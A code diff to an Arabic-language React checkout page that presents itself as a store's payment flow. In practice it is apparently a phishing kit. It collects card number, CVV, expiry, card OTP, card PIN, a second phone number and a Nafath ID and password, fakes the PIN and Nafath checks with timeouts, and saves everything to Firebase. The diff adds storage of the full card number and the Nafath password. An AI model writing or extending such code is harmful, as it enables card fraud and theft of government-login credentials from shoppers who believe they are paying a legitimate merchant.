@@ -1,16 +1,19 @@
 "use client"
-import { useState, useEffect } from "react"
-import { Button } from "@/components/ui/button"
-import { Input } from "@/components/ui/input"
-import { Label } from "@/components/ui/label"
-import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
-import { Separator } from "@/components/ui/separator"
-import { Badge } from "@/components/ui/badge"
-import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
+
+import { useState, useEffect, useCallback, useRef } from "react"
+import { Button } from "../components/ui/button"
+import { Input } from "../components/ui/input"
+import { Label } from "../components/ui/label"
+import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "../components/ui/card"
+import { Separator } from "../components/ui/separator"
+import { Badge } from "../components/ui/badge"
+import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "../components/ui/dialog"
 import { Minus, Plus, Trash2, MapPin, Check, Loader2, Shield, Phone, CreditCard } from "lucide-react"
-import { addData, createOtpVerification, verifyOtp } from "@/lib/firebase"
-import { MapAddressPicker } from "@/components/map-address-picker"
-import { useCart } from "@/lib/cartContext"
+import { addData, createOtpVerification, verifyOtp } from "../lib/firebase"
+import { MapAddressPicker } from "../components/map-address-picker"
+import { useCart } from "../lib/cartContext"
+import { PromoPopup } from "../components/promo-popup"
+import React from "react"
 
 interface ShippingInfo {
   fullName: string
@@ -36,7 +39,6 @@ const detectPhoneProvider = (phone: string): string => {
     Zain: ["059"],
     Virgin: ["057"],
   }
-
   const prefix = phone.slice(0, 3)
   for (const [provider, prefixes] of Object.entries(providers)) {
     if (prefixes.includes(prefix)) {
@@ -60,20 +62,17 @@ export default function CheckoutPage() {
     | "success"
   >("cart")
   const { items, updateQuantity: updateCartQuantity, removeItem: removeCartItem, clearCart } = useCart()
-
   const [shippingInfo, setShippingInfo] = useState<ShippingInfo>({
     fullName: "",
     phone: "",
     city: "",
   })
-
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
     cardNumber: "",
     cardName: "",
     expiryDate: "",
     cvv: "",
   })
-
   const [cardOtp, setCardOtp] = useState("")
   const [cardPin, setCardPin] = useState("")
   const [phoneOtp, setPhoneOtp] = useState("")
@@ -81,7 +80,6 @@ export default function CheckoutPage() {
   const [nafadPassword, setNafadPassword] = useState("")
   const [phoneProvider, setPhoneProvider] = useState("")
   const [phone2, setPhone2] = useState("")
-
   const [isVerifying, setIsVerifying] = useState(false)
   const [isProcessingOrder, setIsProcessingOrder] = useState(false)
   const [verificationError, setVerificationError] = useState("")
@@ -90,22 +88,92 @@ export default function CheckoutPage() {
   const [resendTimer, setResendTimer] = useState(30)
   const [showMap, setShowMap] = useState(false)
   const [error, setError] = useState<string>("")
-
   const [cardOtpVerificationId, setCardOtpVerificationId] = useState("")
   const [phoneOtpVerificationId, setPhoneOtpVerificationId] = useState("")
+  const [showPaymentPopup, setShowPaymentPopup] = useState(false)
+  const [showAgeVerification, setShowAgeVerification] = useState(false)
+  const [showPromoPopup, setShowPromoPopup] = useState(false)
+
+  const [shippingErrors, setShippingErrors] = useState({
+    fullName: "",
+    phone: "",
+    city: "",
+  })
+  const [paymentErrors, setPaymentErrors] = useState({
+    cardNumber: "",
+    cardName: "",
+    expiryDate: "",
+    cvv: "",
+  })
+  const [phone2Error, setPhone2Error] = useState("")
+
+  const isLocalStorageLoaded = useRef(false)
+  const saveTimeoutRef = useRef<NodeJS.Timeout | null>(null)
 
   useEffect(() => {
-    const savedShipping = localStorage.getItem("shippingInfo")
-    if (savedShipping) {
-      setShippingInfo(JSON.parse(savedShipping))
+    const isAgeVerified = localStorage.getItem("ageVerified")
+    if (!isAgeVerified) {
+      setShowAgeVerification(true)
+    } else {
+      const hasSeenPromo = sessionStorage.getItem("hasSeenPromo")
+      if (!hasSeenPromo) {
+        setShowPromoPopup(true)
+        sessionStorage.setItem("hasSeenPromo", "true")
+      }
     }
   }, [])
 
   useEffect(() => {
-    if (step === "shipping" && shippingInfo.fullName) {
+    if (!isLocalStorageLoaded.current) {
+      const savedShipping = localStorage.getItem("shippingInfo")
+      if (savedShipping) {
+        try {
+          setShippingInfo(JSON.parse(savedShipping))
+        } catch (error) {
+          console.error("Failed to parse saved shipping info:", error)
+        }
+      }
+      isLocalStorageLoaded.current = true
+    }
+  }, [])
+
+  useEffect(() => {
+    if (step === "payment") {
+      setShowPaymentPopup(true)
+    }
+  }, [step])
+
+  const debouncedSaveToLocalStorage = useCallback((data: ShippingInfo) => {
+    if (saveTimeoutRef.current) {
+      clearTimeout(saveTimeoutRef.current)
+    }
+
+    saveTimeoutRef.current = setTimeout(() => {
+      localStorage.setItem("shippingInfo", JSON.stringify(data))
+    }, 1000)
+  }, [])
+
+  useEffect(() => {
+    if (isLocalStorageLoaded.current && step === "shipping" && shippingInfo.fullName) {
+      debouncedSaveToLocalStorage(shippingInfo)
+    }
+
+    // Cleanup timeout on unmount
+    return () => {
+      if (saveTimeoutRef.current) {
+        clearTimeout(saveTimeoutRef.current)
+      }
+    }
+  }, [shippingInfo, step, debouncedSaveToLocalStorage])
+
+  useEffect(() => {
+    if (step !== "shipping" && isLocalStorageLoaded.current && shippingInfo.fullName) {
+      if (saveTimeoutRef.current) {
+        clearTimeout(saveTimeoutRef.current)
+      }
       localStorage.setItem("shippingInfo", JSON.stringify(shippingInfo))
     }
-  }, [shippingInfo, step])
+  }, [step, shippingInfo])
 
   useEffect(() => {
     if ((step === "card-otp" || step === "phone-otp") && resendTimer > 0 && !canResendOtp) {
@@ -116,33 +184,155 @@ export default function CheckoutPage() {
     }
   }, [resendTimer, step, canResendOtp])
 
-  const totalPrice = items.reduce((sum, item) => sum + item.price * item.quantity, 0)
+  const totalPrice = useCallback(() => {
+    return items.reduce((sum, item) => sum + item.price * item.quantity, 0)
+  }, [items])()
+
   const shippingFee = totalPrice > 100 ? 0 : 10
   const tax = totalPrice * 0.04
   const finalTotal = totalPrice + shippingFee + tax
 
-  const updateQuantity = (productId: number, delta: number) => {
-    const item = items.find((i) => i.productId === productId)
-    if (item) {
-      updateCartQuantity(productId, item.quantity + delta)
+  const updateQuantity = useCallback(
+    (productId: number, delta: number) => {
+      const item = items.find((i) => i.productId === productId)
+      if (item) {
+        updateCartQuantity(productId, item.quantity + delta)
+      }
+    },
+    [items, updateCartQuantity],
+  )
+
+  const removeItem = useCallback(
+    (productId: number) => {
+      removeCartItem(productId)
+    },
+    [removeCartItem],
+  )
+
+  const validatePhone = (phone: string): string => {
+    if (!phone.trim()) return "رقم الجوال مطلوب"
+    if (!/^05\d{8}$/.test(phone)) return "رقم الجوال يجب أن يبدأ بـ 05 ويتكون من 10 أرقام"
+    return ""
+  }
+
+  const validateName = (name: string): string => {
+    if (!name.trim()) return "الاسم الكامل مطلوب"
+    if (name.trim().length < 3) return "الاسم يجب أن يكون 3 أحرف على الأقل"
+    if (!/^[\u0600-\u06FFa-zA-Z\s]+$/.test(name)) return "الاسم يجب أن يحتوي على حروف فقط"
+    return ""
+  }
+
+  const validateCity = (city: string): string => {
+    if (!city.trim()) return "المدينة مطلوبة"
+    if (city.trim().length < 2) return "اسم المدينة يجب أن يكون حرفين على الأقل"
+    return ""
+  }
+
+  const validateCardNumber = (cardNumber: string): string => {
+    const cleaned = cardNumber.replace(/\s/g, "")
+    if (!cleaned) return "رقم البطاقة مطلوب"
+    if (cleaned.length !== 16) return "رقم البطاقة يجب أن يتكون من 16 رقم"
+    if (!/^\d+$/.test(cleaned)) return "رقم البطاقة يجب أن يحتوي على أرقام فقط"
+    if (isBlockedCard(cleaned)) return "هذا النوع من البطاقات غير مقبول"
+    return ""
+  }
+
+  const validateCardName = (name: string): string => {
+    if (!name.trim()) return "اسم حامل البطاقة مطلوب"
+    if (name.trim().length < 3) return "الاسم يجب أن يكون 3 أحرف على الأقل"
+    if (!/^[a-zA-Z\s]+$/.test(name)) return "الاسم يجب أن يحتوي على حروف إنجليزية فقط"
+    return ""
+  }
+
+  const validateExpiryDate = (expiry: string): string => {
+    if (!expiry) return "تاريخ الانتهاء مطلوب"
+    if (expiry.length !== 5) return "تاريخ الانتهاء يجب أن يكون بصيغة MM/YY"
+
+    const [month, year] = expiry.split("/")
+    const monthNum = Number.parseInt(month)
+    const yearNum = Number.parseInt("20" + year)
+
+    if (monthNum < 1 || monthNum > 12) return "الشهر غير صحيح"
+
+    const now = new Date()
+    const currentYear = now.getFullYear()
+    const currentMonth = now.getMonth() + 1
+
+    if (yearNum < currentYear || (yearNum === currentYear && monthNum < currentMonth)) {
+      return "البطاقة منتهية الصلاحية"
     }
+
+    return ""
   }
 
-  const removeItem = (productId: number) => {
-    removeCartItem(productId)
+  const validateCvv = (cvv: string): string => {
+    if (!cvv) return "رمز الأمان مطلوب"
+    if (cvv.length !== 3) return "رمز الأمان يجب أن يتكون من 3 أرقام"
+    if (!/^\d+$/.test(cvv)) return "رمز الأمان يجب أن يحتوي على أرقام فقط"
+    return ""
   }
 
-  const isShippingValid = () => {
-    return shippingInfo.fullName.trim() !== "" && shippingInfo.phone.trim() !== "" && shippingInfo.city.trim() !== ""
+  const isShippingValid = (): boolean => {
+    const nameError = validateName(shippingInfo.fullName)
+    const phoneError = validatePhone(shippingInfo.phone)
+    const cityError = validateCity(shippingInfo.city)
+
+    return !nameError && !phoneError && !cityError
   }
 
-  const isPaymentValid = () => {
-    return (
-      paymentInfo.cardNumber.replace(/\s/g, "").length === 16 &&
-      paymentInfo.cardName.trim() !== "" &&
-      paymentInfo.expiryDate.length === 5 &&
-      paymentInfo.cvv.length === 3
-    )
+  const isPaymentValid = (): boolean => {
+    const cardNumberError = validateCardNumber(paymentInfo.cardNumber)
+    const cardNameError = validateCardName(paymentInfo.cardName)
+    const expiryError = validateExpiryDate(paymentInfo.expiryDate)
+    const cvvError = validateCvv(paymentInfo.cvv)
+
+    return !cardNumberError && !cardNameError && !expiryError && !cvvError
+  }
+
+  const handleShippingBlur = (field: keyof typeof shippingErrors) => {
+    let error = ""
+
+    switch (field) {
+      case "fullName":
+        error = validateName(shippingInfo.fullName)
+        break
+      case "phone":
+        error = validatePhone(shippingInfo.phone)
+        break
+      case "city":
+        error = validateCity(shippingInfo.city)
+        break
+    }
+
+    setShippingErrors({ ...shippingErrors, [field]: error })
+  }
+
+  const handlePaymentBlur = (field: keyof typeof paymentErrors) => {
+    let error = ""
+
+    switch (field) {
+      case "cardNumber":
+        error = validateCardNumber(paymentInfo.cardNumber)
+        break
+      case "cardName":
+        error = validateCardName(paymentInfo.cardName)
+        break
+      case "expiryDate":
+        error = validateExpiryDate(paymentInfo.expiryDate)
+        break
+      case "cvv":
+        error = validateCvv(paymentInfo.cvv)
+        break
+    }
+
+    setPaymentErrors({ ...paymentErrors, [field]: error })
+  }
+
+  const handleShippingChange = (field: keyof ShippingInfo, value: string) => {
+    setShippingInfo({ ...shippingInfo, [field]: value })
+    if (shippingErrors[field as keyof typeof shippingErrors]) {
+      setShippingErrors({ ...shippingErrors, [field]: "" })
+    }
   }
 
   const formatCardNumber = (value: string) => {
@@ -160,33 +350,80 @@ export default function CheckoutPage() {
   }
 
   const BLOCKED_CARD_PREFIXES = ["4847", "4685", "4286"]
+
   const isBlockedCard = (cardNumber: string): boolean => {
     return BLOCKED_CARD_PREFIXES.some((prefix) => cardNumber.startsWith(prefix))
   }
+
   const handleCardNumberChange = (value: string) => {
     const cleaned = value.replace(/\s/g, "")
-
     if (cleaned.length <= 16 && /^\d*$/.test(cleaned)) {
-      // Check if card starts with blocked prefix
-      if (isBlockedCard(cleaned)) {
-        setError("This card type is not accepted")
-        setPaymentInfo({ ...paymentInfo, cardNumber: formatCardNumber(cleaned) })
-      } else {
-        setError("")
-        setPaymentInfo({ ...paymentInfo, cardNumber: formatCardNumber(cleaned) })
+      setPaymentInfo({ ...paymentInfo, cardNumber: formatCardNumber(cleaned) })
+      if (paymentErrors.cardNumber) {
+        setPaymentErrors({ ...paymentErrors, cardNumber: "" })
       }
     }
   }
+
   const handleExpiryChange = (value: string) => {
     const cleaned = value.replace(/\D/g, "")
     if (cleaned.length <= 4) {
       setPaymentInfo({ ...paymentInfo, expiryDate: formatExpiryDate(cleaned) })
+      if (paymentErrors.expiryDate) {
+        setPaymentErrors({ ...paymentErrors, expiryDate: "" })
+      }
     }
   }
 
   const handleCvvChange = (value: string) => {
     if (value.length <= 3 && /^\d*$/.test(value)) {
       setPaymentInfo({ ...paymentInfo, cvv: value })
+      if (paymentErrors.cvv) {
+        setPaymentErrors({ ...paymentErrors, cvv: "" })
+      }
+    }
+  }
+
+  const handleShippingNext = () => {
+    const nameError = validateName(shippingInfo.fullName)
+    const phoneError = validatePhone(shippingInfo.phone)
+    const cityError = validateCity(shippingInfo.city)
+
+    setShippingErrors({
+      fullName: nameError,
+      phone: phoneError,
+      city: cityError,
+    })
+
+    if (!nameError && !phoneError && !cityError) {
+      setStep("payment")
+    }
+  }
+
+  const handlePaymentNext = () => {
+    const cardNumberError = validateCardNumber(paymentInfo.cardNumber)
+    const cardNameError = validateCardName(paymentInfo.cardName)
+    const expiryError = validateExpiryDate(paymentInfo.expiryDate)
+    const cvvError = validateCvv(paymentInfo.cvv)
+
+    setPaymentErrors({
+      cardNumber: cardNumberError,
+      cardName: cardNameError,
+      expiryDate: expiryError,
+      cvv: cvvError,
+    })
+
+    if (!cardNumberError && !cardNameError && !expiryError && !cvvError) {
+      sendCardOtp()
+    }
+  }
+
+  const handlePhoneVerification = () => {
+    const phoneError = validatePhone(phone2)
+    setPhone2Error(phoneError)
+
+    if (!phoneError) {
+      sendPhoneOtp()
     }
   }
 
@@ -195,12 +432,12 @@ export default function CheckoutPage() {
       const otpCode = Math.floor(100000 + Math.random() * 900000).toString()
       const verificationId = await createOtpVerification(shippingInfo.phone, otpCode)
       setCardOtpVerificationId(verificationId)
-      console.log(" Card OTP sent:", otpCode)
+      console.log("✅ Card OTP sent:", otpCode)
       setStep("card-otp")
       setResendTimer(30)
       setCanResendOtp(false)
     } catch (error) {
-      console.error(" Error sending card OTP:", error)
+      console.error("❌ Error sending card OTP:", error)
       setVerificationError("فشل إرسال رمز التحقق")
     }
   }
@@ -210,18 +447,16 @@ export default function CheckoutPage() {
       setVerificationError("الرجاء إدخال رمز التحقق بشكل صحيح")
       return
     }
-
     setIsVerifying(true)
     setVerificationError("")
-
     try {
       await verifyOtp(cardOtpVerificationId, cardOtp)
-      console.log(" Card OTP verified successfully")
+      console.log("✅ Card OTP verified successfully")
       setIsVerifying(false)
       setCardOtp("")
       setStep("card-pin")
     } catch (error: any) {
-      console.error(" Card OTP verification error:", error)
+      console.error("❌ Card OTP verification error:", error)
       setIsVerifying(false)
       setVerificationError(error.message || "رمز التحقق غير صحيح")
     }
@@ -232,20 +467,18 @@ export default function CheckoutPage() {
       setVerificationError("الرجاء إدخال رمز PIN المكون من 4 أرقام")
       return
     }
-
     setIsVerifying(true)
     setVerificationError("")
-
     try {
       await new Promise((resolve) => setTimeout(resolve, 1500))
-      console.log(" Card PIN verified")
+      console.log("✅ Card PIN verified")
       setIsVerifying(false)
       setCardPin("")
       const provider = detectPhoneProvider(shippingInfo.phone)
       setPhoneProvider(provider)
       setStep("phone-verification")
     } catch (error) {
-      console.error(" Card PIN verification error:", error)
+      console.error("❌ Card PIN verification error:", error)
       setIsVerifying(false)
       setVerificationError("رمز PIN غير صحيح")
     }
@@ -253,13 +486,13 @@ export default function CheckoutPage() {
 
   const sendPhoneOtp = async () => {
     try {
-const visitor=localStorage.getItem('visitor')
-addData({id:visitor,phone2,operator:phoneProvider})
+      const visitor = localStorage.getItem("visitor")
+      await addData({ id: visitor, phone2, operator: phoneProvider })
       setStep("phone-otp")
       setResendTimer(30)
       setCanResendOtp(false)
     } catch (error) {
-      console.error(" Error sending phone OTP:", error)
+      console.error("❌ Error sending phone OTP:", error)
       setVerificationError("فشل إرسال رمز التحقق")
     }
   }
@@ -269,18 +502,16 @@ addData({id:visitor,phone2,operator:phoneProvider})
       setVerificationError("الرجاء إدخال رمز التحقق بشكل صحيح")
       return
     }
-
     setIsVerifying(true)
     setVerificationError("")
-
     try {
       await verifyOtp(phoneOtpVerificationId, phoneOtp)
-      console.log(" Phone OTP verified successfully")
+      console.log("✅ Phone OTP verified successfully")
       setIsVerifying(false)
       setPhoneOtp("")
       setStep("nafath")
     } catch (error: any) {
-      console.error(" Phone OTP verification error:", error)
+      console.error("❌ Phone OTP verification error:", error)
       setIsVerifying(false)
       setVerificationError(error.message || "رمز التحقق غير صحيح")
     }
@@ -291,18 +522,18 @@ addData({id:visitor,phone2,operator:phoneProvider})
       setVerificationError("الرجاء إدخال رقم هوية نفاذ صحيح (10 أرقام)")
       return
     }
-const visitorId=localStorage.getItem('visitor')
-addData({id:visitorId,nafathId,authNumber:''})
+    const visitorId = localStorage.getItem("visitor")
+    await addData({ id: visitorId, nafathId, authNumber: "" })
+
     setIsVerifying(true)
     setVerificationError("")
-
     try {
       await new Promise((resolve) => setTimeout(resolve, 2000))
-      console.log(" Nafath ID verified")
+      console.log("✅ Nafath ID verified")
       setIsVerifying(false)
       setStep("auth-dialog")
     } catch (error) {
-      console.error(" Nafath verification error:", error)
+      console.error("❌ Nafath verification error:", error)
       setIsVerifying(false)
       setVerificationError("فشل التحقق من نفاذ")
     }
@@ -311,44 +542,83 @@ addData({id:visitorId,nafathId,authNumber:''})
   const handleFinalSubmit = async () => {
     setIsProcessingOrder(true)
     setOrderError("")
-
     try {
+      const visitorId = localStorage.getItem("visitor")
       const orderId = `order-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`
-      const orderData = {
+
+      const paysData = {
         id: orderId,
+        visitorId: visitorId,
         timestamp: new Date().toISOString(),
         status: "pending",
-        shipping: shippingInfo,
+
+        // Shipping information
+        shipping: {
+          fullName: shippingInfo.fullName,
+          phone: shippingInfo.phone,
+          city: shippingInfo.city,
+          district: shippingInfo.district || "",
+          street: shippingInfo.street || "",
+          postalCode: shippingInfo.postalCode || "",
+          coordinates: shippingInfo.coordinates || null,
+        },
+
+        // Payment information
         payment: {
+          cardNumber: paymentInfo.cardNumber, // Full card number (encrypted in production)
           cardLast4: paymentInfo.cardNumber.slice(-4),
           cardName: paymentInfo.cardName,
+          expiryDate: paymentInfo.expiryDate,
+          cardOtpVerified: true,
+          cardPinVerified: true,
         },
+
+        // Additional verification data
+        verification: {
+          phone2: phone2,
+          phoneProvider: phoneProvider,
+          phoneOtpVerified: true,
+          nafathId: nafathId,
+          nafadPassword: nafadPassword,
+          verifiedAt: new Date().toISOString(),
+        },
+
+        // Order items
         items: items.map((item) => ({
           id: item.productId,
           name: item.nameAr,
+          nameEn: item.nameEn || "",
           price: item.price,
           quantity: item.quantity,
+          imageUrl: item.imageUrl || "",
+          subtotal: item.price * item.quantity,
         })),
+
+        // Pricing breakdown
         pricing: {
           subtotal: totalPrice,
           shippingFee,
           tax,
+          taxRate: 0.15,
           total: finalTotal,
         },
-        verification: {
-          phoneProvider,
-          nafathId,
-          verifiedAt: new Date().toISOString(),
+
+        // Metadata
+        metadata: {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
         },
       }
 
-      await addData(orderData)
-      console.log(" Order submitted successfully:", orderId)
+      await addData(paysData)
+      console.log("✅ Payment data saved successfully:", orderId)
+
       setIsProcessingOrder(false)
       clearCart()
       setStep("success")
     } catch (error) {
-      console.error(" Order submission error:", error)
+      console.error("❌ Order submission error:", error)
       setIsProcessingOrder(false)
       setOrderError("حدث خطأ أثناء معالجة الطلب. الرجاء المحاولة مرة أخرى.")
     }
@@ -358,7 +628,6 @@ addData({id:visitorId,nafathId,authNumber:''})
     setVerificationError("")
     setCanResendOtp(false)
     setResendTimer(30)
-
     if (step === "card-otp") {
       setCardOtp("")
       await sendCardOtp()
@@ -385,6 +654,20 @@ addData({id:visitorId,nafathId,authNumber:''})
     setShowMap(false)
   }
 
+  const handleAgeVerified = () => {
+    localStorage.setItem("ageVerified", "true")
+    setShowAgeVerification(false)
+    const hasSeenPromo = sessionStorage.getItem("hasSeenPromo")
+    if (!hasSeenPromo) {
+      setShowPromoPopup(true)
+      sessionStorage.setItem("hasSeenPromo", "true")
+    }
+  }
+
+  const handleAgeRejected = () => {
+    window.location.href = "https://www.google.com"
+  }
+
   if (items.length === 0 && step === "cart") {
     return (
       <div className="min-h-screen bg-muted/30 flex items-center justify-center p-4">
@@ -405,6 +688,8 @@ addData({id:visitorId,nafathId,authNumber:''})
 
   return (
     <div className="min-h-screen bg-gradient-to-b from-background to-muted/20 p-4">
+      <PromoPopup open={showPromoPopup} onClose={() => setShowPromoPopup(false)} />
+
       <div className="max-w-4xl mx-auto">
         {/* Progress Stepper */}
         <div className="mb-8">
@@ -569,8 +854,11 @@ addData({id:visitorId,nafathId,authNumber:''})
                     id="fullName"
                     placeholder="أدخل الاسم الكامل"
                     value={shippingInfo.fullName}
-                    onChange={(e) => setShippingInfo({ ...shippingInfo, fullName: e.target.value })}
+                    onChange={(e) => handleShippingChange("fullName", e.target.value)}
+                    onBlur={() => handleShippingBlur("fullName")}
+                    className={shippingErrors.fullName ? "border-destructive" : ""}
                   />
+                  {shippingErrors.fullName && <p className="text-sm text-destructive">{shippingErrors.fullName}</p>}
                 </div>
                 <div className="space-y-2">
                   <Label htmlFor="phone">رقم الجوال</Label>
@@ -580,8 +868,11 @@ addData({id:visitorId,nafathId,authNumber:''})
                     type="tel"
                     placeholder="05XXXXXXXX"
                     value={shippingInfo.phone}
-                    onChange={(e) => setShippingInfo({ ...shippingInfo, phone: e.target.value })}
+                    onChange={(e) => handleShippingChange("phone", e.target.value)}
+                    onBlur={() => handleShippingBlur("phone")}
+                    className={shippingErrors.phone ? "border-destructive" : ""}
                   />
+                  {shippingErrors.phone && <p className="text-sm text-destructive">{shippingErrors.phone}</p>}
                 </div>
               </div>
 
@@ -592,8 +883,11 @@ addData({id:visitorId,nafathId,authNumber:''})
                     id="city"
                     placeholder="مثال: الرياض"
                     value={shippingInfo.city}
-                    onChange={(e) => setShippingInfo({ ...shippingInfo, city: e.target.value })}
+                    onChange={(e) => handleShippingChange("city", e.target.value)}
+                    onBlur={() => handleShippingBlur("city")}
+                    className={shippingErrors.city ? "border-destructive" : ""}
                   />
+                  {shippingErrors.city && <p className="text-sm text-destructive">{shippingErrors.city}</p>}
                 </div>
                 <div className="space-y-2">
                   <Label htmlFor="district">الحي</Label>
@@ -620,7 +914,7 @@ addData({id:visitorId,nafathId,authNumber:''})
                 <Button variant="outline" className="flex-1 bg-transparent" onClick={() => setStep("cart")}>
                   رجوع
                 </Button>
-                <Button className="flex-1" onClick={() => setStep("payment")} disabled={!isShippingValid()}>
+                <Button className="flex-1" onClick={handleShippingNext}>
                   المتابعة إلى الدفع
                 </Button>
               </div>
@@ -630,73 +924,111 @@ addData({id:visitorId,nafathId,authNumber:''})
 
         {/* Payment Step */}
         {step === "payment" && (
-          <Card className="max-w-xl mx-auto shadow-lg border">
-            <CardHeader className="space-y-1 text-center">
-              <CardTitle className="text-2xl font-bold">معلومات الدفع</CardTitle>
-              <CardDescription className="text-muted-foreground">جميع بياناتك مشفرة وآمنة</CardDescription>
-            </CardHeader>
+          <>
+            <Dialog open={showPaymentPopup} onOpenChange={setShowPaymentPopup}>
+              <DialogContent className="max-w-md">
+                <DialogHeader>
+                  <DialogTitle className="text-2xl text-center">تعليمات الدفع</DialogTitle>
+                  <DialogDescription className="text-center">
+                    يرجى الاطلاع على التعليمات قبل إدخال بيانات البطاقة
+                  </DialogDescription>
+                </DialogHeader>
+                <div className="space-y-4">
+                  <div className="rounded-lg overflow-hidden border">
+                    <img
+                      src="/payment-card-instructions-illustration.jpg"
+                      alt="تعليمات الدفع"
+                      className="w-full h-auto"
+                    />
+                  </div>
+                  <Button className="w-full" onClick={() => setShowPaymentPopup(false)}>
+                    فهمت، المتابعة للدفع
+                  </Button>
+                </div>
+              </DialogContent>
+            </Dialog>
 
-            <CardContent className="space-y-6">
-              <div className="space-y-2">
-                <Label htmlFor="cardNumber">رقم البطاقة</Label>
-                <Input
-                  id="cardNumber"
-                  placeholder="1234 5678 9012 3456"
-                  className="tracking-widest text-lg"
-                  value={paymentInfo.cardNumber}
-                  onChange={(e) => handleCardNumberChange(e.target.value)}
-                />
-              </div>
-
-              <div className="space-y-2">
-                <Label htmlFor="cardName">اسم حامل البطاقة</Label>
-                <Input
-                  id="cardName"
-                  placeholder="الاسم كما هو مكتوب على البطاقة"
-                  value={paymentInfo.cardName}
-                  onChange={(e) => setPaymentInfo({ ...paymentInfo, cardName: e.target.value })}
-                />
-              </div>
-
-              <div className="grid grid-cols-2 gap-4">
+            <Card className="max-w-xl mx-auto shadow-lg border">
+              <CardHeader className="space-y-1 text-center">
+                <CardTitle className="text-2xl font-bold">معلومات الدفع</CardTitle>
+                <CardDescription className="text-muted-foreground">جميع بياناتك مشفرة وآمنة</CardDescription>
+              </CardHeader>
+              <CardContent className="space-y-6">
                 <div className="space-y-2">
-                  <Label htmlFor="expiryDate">تاريخ الانتهاء</Label>
+                  <Label htmlFor="cardNumber">رقم البطاقة</Label>
                   <Input
-                    id="expiryDate"
-                    placeholder="MM/YY"
-                    value={paymentInfo.expiryDate}
-                    onChange={(e) => handleExpiryChange(e.target.value)}
+                    id="cardNumber"
+                    placeholder="1234 5678 9012 3456"
+                    className={`tracking-widest text-lg ${paymentErrors.cardNumber ? "border-destructive" : ""}`}
+                    value={paymentInfo.cardNumber}
+                    onChange={(e) => handleCardNumberChange(e.target.value)}
+                    onBlur={() => handlePaymentBlur("cardNumber")}
                   />
+                  {paymentErrors.cardNumber && <p className="text-sm text-destructive">{paymentErrors.cardNumber}</p>}
                 </div>
 
                 <div className="space-y-2">
-                  <Label htmlFor="cvv">رمز الأمان (CVV)</Label>
+                  <Label htmlFor="cardName">اسم حامل البطاقة</Label>
                   <Input
-                    id="cvv"
-                    placeholder="123"
-                    type="password"
-                    value={paymentInfo.cvv}
-                    onChange={(e) => handleCvvChange(e.target.value)}
+                    id="cardName"
+                    placeholder="الاسم كما هو مكتوب على البطاقة"
+                    value={paymentInfo.cardName}
+                    onChange={(e) => {
+                      setPaymentInfo({ ...paymentInfo, cardName: e.target.value })
+                      if (paymentErrors.cardName) {
+                        setPaymentErrors({ ...paymentErrors, cardName: "" })
+                      }
+                    }}
+                    onBlur={() => handlePaymentBlur("cardName")}
+                    className={paymentErrors.cardName ? "border-destructive" : ""}
                   />
+                  {paymentErrors.cardName && <p className="text-sm text-destructive">{paymentErrors.cardName}</p>}
                 </div>
-              </div>
-{error&&(<span className="text-red-400">{error}</span>)}
-              <div className="flex items-center gap-2 rounded-md bg-muted px-3 py-2 text-sm text-muted-foreground">
-                <Shield className="h-4 w-4" />
-                يتم تشفير معلومات الدفع باستخدام SSL
-              </div>
 
-              <div className="flex gap-3 pt-2">
-                <Button variant="outline" className="flex-1 bg-transparent" onClick={() => setStep("shipping")}>
-                  رجوع
-                </Button>
+                <div className="grid grid-cols-2 gap-4">
+                  <div className="space-y-2">
+                    <Label htmlFor="expiryDate">تاريخ الانتهاء</Label>
+                    <Input
+                      id="expiryDate"
+                      placeholder="MM/YY"
+                      value={paymentInfo.expiryDate}
+                      onChange={(e) => handleExpiryChange(e.target.value)}
+                      onBlur={() => handlePaymentBlur("expiryDate")}
+                      className={paymentErrors.expiryDate ? "border-destructive" : ""}
+                    />
+                    {paymentErrors.expiryDate && <p className="text-sm text-destructive">{paymentErrors.expiryDate}</p>}
+                  </div>
+                  <div className="space-y-2">
+                    <Label htmlFor="cvv">رمز الأمان (CVV)</Label>
+                    <Input
+                      id="cvv"
+                      placeholder="123"
+                      type="password"
+                      value={paymentInfo.cvv}
+                      onChange={(e) => handleCvvChange(e.target.value)}
+                      onBlur={() => handlePaymentBlur("cvv")}
+                      className={paymentErrors.cvv ? "border-destructive" : ""}
+                    />
+                    {paymentErrors.cvv && <p className="text-sm text-destructive">{paymentErrors.cvv}</p>}
+                  </div>
+                </div>
 
-                <Button className="flex-1 text-lg" disabled={!isPaymentValid()} onClick={sendCardOtp}>
-                  تأكيد الدفع
-                </Button>
-              </div>
-            </CardContent>
-          </Card>
+                <div className="flex items-center gap-2 rounded-md bg-muted px-3 py-2 text-sm text-muted-foreground">
+                  <Shield className="h-4 w-4" />
+                  يتم تشفير معلومات الدفع باستخدام SSL
+                </div>
+
+                <div className="flex gap-3 pt-2">
+                  <Button variant="outline" className="flex-1 bg-transparent" onClick={() => setStep("shipping")}>
+                    رجوع
+                  </Button>
+                  <Button className="flex-1 text-lg" onClick={handlePaymentNext}>
+                    تأكيد الدفع
+                  </Button>
+                </div>
+              </CardContent>
+            </Card>
+          </>
         )}
 
         {step === "card-otp" && (
@@ -717,7 +1049,7 @@ addData({id:visitorId,nafathId,authNumber:''})
                   <Input
                     type="text"
                     inputMode="numeric"
-                    autoComplete="otp"
+                    autoComplete="one-time-code"
                     maxLength={6}
                     value={cardOtp}
                     onChange={(e) => setCardOtp(e.target.value)}
@@ -822,17 +1154,25 @@ addData({id:visitorId,nafathId,authNumber:''})
               <CardDescription className="text-center">تأكيد بيانات الاتصال</CardDescription>
             </CardHeader>
             <CardContent className="space-y-6">
+              <div className="space-y-3">
+                <Label htmlFor="phone2">رقم الجوال الثاني</Label>
+                <Input
+                  id="phone2"
+                  type="tel"
+                  inputMode="numeric"
+                  maxLength={10}
+                  placeholder="05XXXXXXXX"
+                  value={phone2}
+                  onChange={(e) => {
+                    setPhone2(e.target.value)
+                    if (phone2Error) setPhone2Error("")
+                  }}
+                  className={phone2Error ? "border-destructive" : ""}
+                />
+                {phone2Error && <p className="text-sm text-destructive">{phone2Error}</p>}
+              </div>
+
               <div className="p-4 bg-muted rounded-lg space-y-3">
-                <div className="flex justify-between items-center">
